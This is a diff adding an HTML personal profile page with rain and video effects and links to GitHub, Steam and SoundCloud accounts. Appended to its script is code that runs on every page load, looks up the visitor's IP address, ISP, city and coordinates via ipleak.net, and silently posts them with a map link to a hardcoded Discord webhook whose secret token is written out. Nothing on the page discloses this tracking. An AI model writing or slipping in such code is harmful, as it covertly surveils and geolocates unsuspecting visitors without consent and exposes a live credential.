@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+
+    <!-- Favicon link (add your logo file path) -->
+    <link rel="icon" href="assets/logo.ico" type="image/x-icon">
+    <!-- Replace 'assets/logo.ico' with your actual logo file path -->
+
+    <!-- Google Fonts Link -->
+    <link href="https://fonts.google.com/noto/specimen/Noto+Sans+Display?preview.text=misery302&query=ancient"
+        rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            overflow: hidden;
+            position: relative;
+            cursor: url('assets/cursor.cur'), auto;
+            /* Custom cursor */
+        }
+
+        /* Video Background Styling */
+        #backgroundVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 0;
+            display: none;
+            /* Hidden initially */
+            background-color: #000000;
+            opacity: 0;
+            /* Initially hidden */
+            pointer-events: none;
+            /* Prevent interaction with video */
+            transition: opacity 2s ease-in-out;
+            /* Fade-in animation */
+        }
+
+        .profile-container {
+            position: relative;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0);
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 2;
+        }
+
+        .profile-pic {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            background: url('assets/invisible.png') center center no-repeat;
+            background-size: cover;
+            position: absolute;
+            top: -210px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 0px solid #000000;
+        }
+
+        .username {
+            font-size: 40px;
+            font-weight: normal;
+            margin-top: -90px;
+            position: relative;
+            text-shadow: 1px 1px 20px rgba(0, 0, 0, 1);
+            /* Shadow added here */
+            background-image: url(assets/black_particle.gif);
+            filter: drop-shadow(#000000 1px 0 7px);
+        }
+
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 60px;
+        }
+
+        .icon {
+            width: 40px;
+            height: 40px;
+            cursor: url('assets/cursor.cur'), auto;
+            /* Custom cursor for icons */
+            transition: transform 0.3s ease-in-out;
+            /* Transition for scaling */
+            filter: drop-shadow(#000000 1px 0 7px);
+        }
+
+        .icon:hover {
+            transform: scale(1.2);
+            /* Scale the icon by 20% */
+        }
+
+        /* Black Overlay */
+        .black-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            z-index: 4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: url('assets/cursor.cur'), auto;
+            /* Custom cursor for overlay */
+            opacity: 1;
+            transition: opacity 2s ease;
+            /* Slow fade-out */
+        }
+
+        .rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .raindrop {
+            position: absolute;
+            top: -10%;
+            width: 3px;
+            height: 3px;
+            background: white;
+            opacity: 0.5;
+            animation: fall linear infinite;
+            /* Make it infinite */
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(0) translateX(0);
+                /* Start at the top */
+                opacity: 0.5;
+                /* Start with full opacity */
+            }
+
+            100% {
+                transform: translateY(120vh) translateX(calc(-10px + 20px * var(--direction)));
+                /* Fall to the bottom */
+                opacity: 0;
+                /* Fade out as it falls */
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Background Video -->
+    <video id="backgroundVideo" muted loop autoplay playsinline>
+        <source src="assets/background.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Black Blur Overlay -->
+    <div class="black-overlay" id="blackOverlay"></div>
+
+    <!-- Profile Container -->
+    <div class="profile-container">
+        <div class="profile-pic"></div>
+        <div class="username" id="username">60</div>
+        <div class="icon-container">
+            <a href="https://github.com/60-t" target="_blank">
+                <img src="assets/Github_white.svg" class="icon" alt="Github">
+            </a>
+
+            <a href="https://steamcommunity.com/id/60-t/" target="_blank">
+                <img src="assets/Steam_white.svg" class="icon" alt="Steam">
+            </a>
+            <a href="https://soundcloud.com/60-t" target="_blank">
+                <img src="assets/Soundcloud_white.svg" class="icon" alt="Soundcloud">
+            </a>
+        </div>
+    </div>
+
+    <!-- Rain Effect -->
+    <div class="rain" id="rainEffect"></div>
+
+    <audio id="backgroundMusic" loop>
+        <source src="assets/music.mp3" type="audio/mpeg">
+        Your browser does not support the audio tag.
+    </audio>
+
+    <script>
+        // Generate raindrops with random positions and speeds
+        const rainContainer = document.getElementById('rainEffect');
+        const raindropCount = 100;
+        const maxRaindropDuration = 3;
+
+        function createRaindrop() {
+            const raindrop = document.createElement('div');
+            raindrop.classList.add('raindrop');
+
+            // Set random horizontal position
+            raindrop.style.left = Math.random() * 100 + 'vw';
+
+            // Set random animation duration (speed of fall)
+            const duration = 2 + Math.random() * maxRaindropDuration; // Random duration for falling
+            raindrop.style.animationDuration = `${duration}s`;
+
+            // Set random animation delay (so that raindrops start at different times)
+            raindrop.style.animationDelay = Math.random() * -5 + 's';
+
+            // Random direction to make rain look more natural
+            raindrop.style.setProperty('--direction', Math.random() * 2 - 1);
+
+            // Append to rain container
+            rainContainer.appendChild(raindrop);
+
+            // Remove the raindrop after its animation ends, to keep the DOM clean
+            raindrop.addEventListener('animationiteration', () => {
+                raindrop.remove();
+                createRaindrop();  // Create a new raindrop when one finishes falling
+            });
+        }
+
+        // Create initial raindrops and continuously generate more
+        for (let i = 0; i < raindropCount; i++) {
+            createRaindrop();
+        }
+
+        // Play the background music and start video after overlay fade-out
+        const blackOverlay = document.getElementById('blackOverlay');
+        const music = document.getElementById('backgroundMusic');
+        const video = document.getElementById('backgroundVideo');
+
+        blackOverlay.addEventListener('click', () => {
+            music.volume = 0;
+            music.play();
+
+            // Gradually increase music volume
+            let volumeIncreaseInterval = setInterval(() => {
+                if (music.volume < 1) {
+                    music.volume = Math.min(music.volume + 0.1, 1);
+                } else {
+                    clearInterval(volumeIncreaseInterval);
+                }
+            }, 200);
+
+            // Start fading out the overlay and fading in the video at the same time
+            blackOverlay.style.opacity = '0';  // Fade out overlay
+            video.style.display = 'block';  // Show video
+            video.style.opacity = '1';  // Start fading in video
+
+            // Play the video after the fade-in starts
+            video.play();
+
+            setTimeout(() => {
+                blackOverlay.style.display = 'none'; // Hide the overlay completely after fade
+            }, 2000); // Ensure the overlay fades out before it's hidden
+        });
+
+        // Typing and Deleting Effect for browser title
+        const originalTitle = "@60";
+        const deleteSpeed = 300; // Speed for deleting text in milliseconds
+        const typingSpeed = 300; // Speed for typing text in milliseconds
+
+        let titleIndex = 0;
+        let titleDeleteIndex = originalTitle.length;
+
+        // Typing effect function
+        function typeTitle() {
+            if (titleIndex < originalTitle.length) {
+                document.title += originalTitle.charAt(titleIndex);
+                titleIndex++;
+                setTimeout(typeTitle, typingSpeed);
+            } else {
+                setTimeout(deleteTitle, 0); // Start deleting after typing
+            }
+        }
+
+        // Deleting effect function
+        function deleteTitle() {
+            if (titleDeleteIndex >= 1) {
+                document.title = document.title.slice(0, titleDeleteIndex);
+                titleDeleteIndex--;
+                setTimeout(deleteTitle, deleteSpeed);
+            } else {
+                titleIndex = 1;
+                titleDeleteIndex = originalTitle.length;
+                setTimeout(typeTitle, 0); // Start typing again after deleting
+            }
+        }
+
+        // Start the typing effect when the page loads
+        window.onload = () => {
+            typeTitle();
+            video.style.display = 'none';  // Hide video initially
+        };
+
+        // Function to fetch data from a given URL with error handling
+async function fetchData(url) {
+    try {
+        const response = await fetch(url);
+        if (!response.ok) throw new Error(`Failed to fetch: ${url}`);
+        return await response.json();
+    } catch (error) {
+        console.error(`Error fetching data from ${url}:`, error.message);
+        return null; // Return null if the fetch fails
+    }
+}
+
+// Function to format visitor information and send it to Discord
+async function sendVisitorInfoToWebhook() {
+    try {
+        // Fetch visitor data from ipleak.net
+        const visitorData = await fetchData('https://ipleak.net/json/');
+        if (!visitorData) return; // Stop if visitor data is unavailable
+
+        // Extract and prepare visitor information
+        const visitorInfo = {
+            ip: visitorData.ip || "Unknown",
+            isp: visitorData.isp_name || "Unknown",
+            asn: visitorData.as_number || "Unknown",
+            country: visitorData.country_name || "Unknown",
+            countryCode: visitorData.country_code || "Unknown",
+            region: visitorData.region_name || "Unknown",
+            regionCode: visitorData.region_code || "Unknown",
+            city: visitorData.city_name || "Unknown",
+            timezone: visitorData.time_zone || "Unknown",
+            latitude: visitorData.latitude || 0,
+            longitude: visitorData.longitude || 0,
+            accuracyRadius: visitorData.accuracy_radius || "Unknown",
+            mapLink: `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`,
+            queryDate: new Date(visitorData.query_date * 1000 || Date.now()).toLocaleString(),
+        };
+
+        // Create the Discord embed payload
+        const embed = {
+            title: "Visitor's IP and Geolocation Information",
+            color: 0x000000,
+            fields: [
+                { name: "IP", value: visitorInfo.ip, inline: true },
+                { name: "ISP", value: visitorInfo.isp, inline: true },
+                { name: "ASN", value: visitorInfo.asn.toString(), inline: true },
+                { name: "Country", value: `${visitorInfo.country} (${visitorInfo.countryCode})`, inline: true },
+                { name: "Region", value: `${visitorInfo.region} (${visitorInfo.regionCode})`, inline: true },
+                { name: "City", value: visitorInfo.city, inline: true },
+                { name: "Time Zone", value: visitorInfo.timezone, inline: true },
+                { name: "Latitude & Longitude", value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`, inline: true },
+                { name: "Accuracy Radius", value: `${visitorInfo.accuracyRadius} KM`, inline: true },
+                { name: "Geolocation Map", value: `[Activate](${visitorInfo.mapLink})`, inline: false },
+                { name: "Last Data Update", value: visitorInfo.queryDate, inline: false },
+            ]
+        };
+
+        // Send the data to Discord webhook
+        const webhookURL = 'https://discord.com/api/webhooks/1331046923418865796/4CvwUvu6J4OqaJOWppBbdf1wmw_i9KqwitdHOfSVMNp2MgP2tzeYM6_l7M8gQTaO1oeJ';
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] }),
+        });
+
+        if (response.ok) {
+            console.log('Visitor info sent successfully!');
+        } else {
+            console.error('Failed to send data to Discord webhook:', response.statusText);
+        }
+    } catch (error) {
+        console.error('Unexpected error:', error.message);
+    }
+}
+
+// Run the function
+sendVisitorInfoToWebhook();
+
+
+    </script>
+
+</body>
+
+</html>
